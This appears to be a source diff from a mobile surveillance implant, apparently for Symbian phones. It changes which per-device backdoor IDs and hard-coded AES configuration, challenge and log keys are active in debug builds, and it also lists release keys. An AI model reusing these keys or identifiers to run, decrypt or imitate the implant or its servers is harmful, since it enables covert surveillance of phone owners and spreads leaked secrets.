@@ -30,19 +30,12 @@ _LIT8(KIV, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");
 #ifdef _DEBUG
 //_LIT8(KBACKDOORID, "RCS_0000000317\x00\x00");    //backdoor su prod/castore N97Mini
 //_LIT8(KBACKDOORID, "RCS_0000000205\x00\x00");    //backdoor su prod N81
-//_LIT8(KBACKDOORID, "RCS_0000000005\x00\x00");    //backdoor su preprod/polluce N97Mini
-//_LIT8(KBACKDOORID, "RCS_0000000012\x00\x00");    //backdoor su preprod ExternalPartner
-//_LIT8(KBACKDOORID, "RCS_0000000244\x00\x00");    //backdoor su preprod UZC Test
-//_LIT8(KBACKDOORID, "RCS_0000000076\x00\x00");    //backdoor su preprod E71
-_LIT8(KBACKDOORID, "RCS_0000000181\x00\x00");    //backdoor su preprod/polluce N96
+//_LIT8(KBACKDOORID, "RCS_0000000028\x00\x00");    //backdoor su preprod/polluce N96
 //_LIT8(KBACKDOORID, "RCS_0000000475\x00\x00");    //backdoor su prod E61
-//_LIT8(KBACKDOORID, "RCS_0000000063\x00\x00");    //backdoor su preprod E61
-//_LIT8(KBACKDOORID, "RCS_0000000018\x00\x00");    //backdoor su preprod E72
 //_LIT8(KBACKDOORID, "RCS_0000000453\x00\x00");    //backdoor su prod N97Mini UNINSTALL
 //_LIT8(KBACKDOORID, "RCS_0000000135\x00\x00");    //backdoor su prod/castore E72
 //_LIT8(KBACKDOORID, "RCS_0000000455\x00\x00");    //backdoor su prod/castore E71
-//_LIT8(KBACKDOORID, "RCS_0000000125\x00\x00");    //backdoor su prod/castore N96
-//_LIT8(KBACKDOORID, "RCS_0000000179\x00\x00");    //backdoor su polluce N81
+_LIT8(KBACKDOORID, "RCS_0000000125\x00\x00");    //backdoor su prod/castore N96
 #else
 _LIT8(KBACKDOORID, "av3pVck1gb4eR2\x00\x00");
 #endif
@@ -51,28 +44,20 @@ _LIT8(KBACKDOORID, "av3pVck1gb4eR2\x00\x00");
 #ifdef _DEBUG
 //_LIT8(KAES_CONFIG_KEY,"2aea9bec25ee2bfc8b4ab86d24a4d7b8"); //RCS_0000000317  //N97mini prod/castore
 //_LIT8(KAES_CONFIG_KEY,"cc2c7eff25615393e1d110194974c511"); //RCS_0000000205  //N81 prod
-//_LIT8(KAES_CONFIG_KEY,"b22d3cd68cf1f376c86855823d0852a0"); //RCS_0000000005  //N97mini preprod/polluce
-//_LIT8(KAES_CONFIG_KEY,"abce2a78b54420e9a33d70c212fe3d83"); //RCS_0000000012  //ExternalPartner preprod
-//_LIT8(KAES_CONFIG_KEY,"9d63d54b84c634e5aca2a7a6c7b26967"); //RCS_0000000244  //UZC Test polluce
-//_LIT8(KAES_CONFIG_KEY,"bffb2b51e298730bc6806de8de4869b9"); //RCS_0000000076  //E71 preprod
-_LIT8(KAES_CONFIG_KEY,"28369b7618f651239be4739f79c708d1"); //RCS_0000000181  //N96 preprod/polluce
+//_LIT8(KAES_CONFIG_KEY,"5703d7e73a7534c7b9f01d6f960cd575"); //RCS_0000000028  //N96 preprod/polluce
 //_LIT8(KAES_CONFIG_KEY,"34e5e13c98d14d2317c4f52c513af286"); //RCS_0000000475  //E61 prod
-//_LIT8(KAES_CONFIG_KEY,"71d6ccbcab12055099149ce3f5d752d9"); //RCS_0000000063  //E61 preprod
-//_LIT8(KAES_CONFIG_KEY,"398cc8658b76f897825b3165fa939f6d"); //RCS_0000000018  //E72 preprod
 //_LIT8(KAES_CONFIG_KEY,"28745df4927a0fcca3c40abae83c3881"); //RCS_0000000135  //E72 prod/castore
 //_LIT8(KAES_CONFIG_KEY,"7cddcb1b75b6f702a21c4f917ea7c201"); //RCS_0000000455  //E71 prod/castore
-//_LIT8(KAES_CONFIG_KEY,"7e0f09bed05d4f0ea6b7594efa1d4cdb"); //RCS_0000000125  //N96 prod/castore
+_LIT8(KAES_CONFIG_KEY,"7e0f09bed05d4f0ea6b7594efa1d4cdb"); //RCS_0000000125  //N96 prod/castore
 //_LIT8(KAES_CONFIG_KEY,"13f49991883eae5ee4c68424e7e5660e"); //RCS_0000000453  //N97mini prod UNINSTALL
-//_LIT8(KAES_CONFIG_KEY,"03ad0c9ff3a68f67725f3b6dc0a96d40"); //RCS_0000000179  //N81 polluce
 #else
 _LIT8(KAES_CONFIG_KEY, "Adf5V57gQtyi90wUhpb8Neg56756j87R");
 #endif
 
 //Challenge key or Signature, the same for all bkdoors on the same server
 #ifdef _DEBUG
-//_LIT8(KAES_CHALLENGE_KEY, "572ebc94391281ccf53a851330bb0d99"); //RCS_0000000317 //N97Mini prod/castore
-//_LIT8(KAES_CHALLENGE_KEY, "96778af9756a30489f6435bb0655eec2"); //RCS_0000000012 //ExternalPartner preprod
-_LIT8(KAES_CHALLENGE_KEY, "96778af9756a30489f6435bb0655eec2"); //RCS_0000000063 //E61 preprod/polluce
+_LIT8(KAES_CHALLENGE_KEY, "572ebc94391281ccf53a851330bb0d99"); //RCS_0000000317 //N97Mini prod/castore
+//_LIT8(KAES_CHALLENGE_KEY, "840da4c68e7dbca9f927de9314e0b586"); //preprod/polluce
 #else
 _LIT8(KAES_CHALLENGE_KEY, "f7Hk0f5usd04apdvqw13F5ed25soV5eD");
 #endif
@@ -81,22 +66,15 @@ _LIT8(KAES_CHALLENGE_KEY, "f7Hk0f5usd04apdvqw13F5ed25soV5eD");
 #ifdef _DEBUG
 //_LIT8(KAES_LOGS_KEY, "95dac559b0edfffc543b06b46c43e610");  //RCS_0000000317  //N97Mini su prod/castore
 //_LIT8(KAES_LOGS_KEY, "87f8398188d816f74657188b7e2a1370");  //RCS_0000000205  //N81 su prod
-//_LIT8(KAES_LOGS_KEY, "a875373040a90f4a8d8dfc00ef4cc645");  //RCS_0000000005  //N97Mini su preprod/polluce
-//_LIT8(KAES_LOGS_KEY, "0640685495f69a6d250951f9e707ed1b");  //RCS_0000000012  //ExternalPartner su preprod
-//_LIT8(KAES_LOGS_KEY, "909726a2c42b7ca56d86b0f16000f311");  //RCS_0000000244  //UZC Test su polluce
-//_LIT8(KAES_LOGS_KEY, "656b3dff1c1efa25e8348639e76a7973");  //RCS_0000000076  //E71 su preprod
-_LIT8(KAES_LOGS_KEY, "916db3525f83762320b07e024eb00270");  //RCS_0000000181  //N96 su preprod/polluce
+//_LIT8(KAES_LOGS_KEY, "3a52790b6627a53da5605aa8b5bc4655");  //RCS_0000000028  //N96 su preprod/polluce
 //_LIT8(KAES_LOGS_KEY, "1b50df977cef743ea28f019bde34c727");  //RCS_0000000012  //E61 su prod
-//_LIT8(KAES_LOGS_KEY, "afb16f3085c03382929057fd804ee9c9");  //RCS_0000000063  //E61 su preprod
 //_LIT8(KAES_LOGS_KEY, "d4078fdf640118f158792a39cf70bab4");  //RCS_0000000135  //E72 su prod/castore
 //_LIT8(KAES_LOGS_KEY, "597cd89c7e39d395438113da1c879940");  //RCS_0000000455  //E71 su prod/castore
 //_LIT8(KAES_LOGS_KEY, "02ab00be97a461fedf9ceeacb0ef73f3");  //RCS_0000000125  //N96 su prod
 //_LIT8(KAES_LOGS_KEY, "36cf605bf75fd11edde58b6ec98997e6");  //RCS_0000000453  //N97Mini su prod UNINSTALL
 //_LIT8(KAES_LOGS_KEY, "96db502bbee4cd75f09a7aa9d3c6d659");  //RCS_0000000246  //Montalbano
-//_LIT8(KAES_LOGS_KEY, "02ab00be97a461fedf9ceeacb0ef73f3");  //RCS_0000000125  //N96 prod/castore
-//_LIT8(KAES_LOGS_KEY, "321700fc1dbabd05a3551dc424bf37bc");  //RCS_0000000018  //E72 preprod
+_LIT8(KAES_LOGS_KEY, "02ab00be97a461fedf9ceeacb0ef73f3");  //RCS_0000000125  //N96 prod/castore
 //_LIT8(KAES_LOGS_KEY, "87f8398188d816f74657188b7e2a1370");  //RCS_0000000205  //N81
-//_LIT8(KAES_LOGS_KEY, "1597bb504632f51edd98ce83184c29c3");  //RCS_0000000179  //N81 su polluce
 #else
 _LIT8(KAES_LOGS_KEY, "3j9WmmDgBqyU270FTid3719g64bP4s52");
 #endif
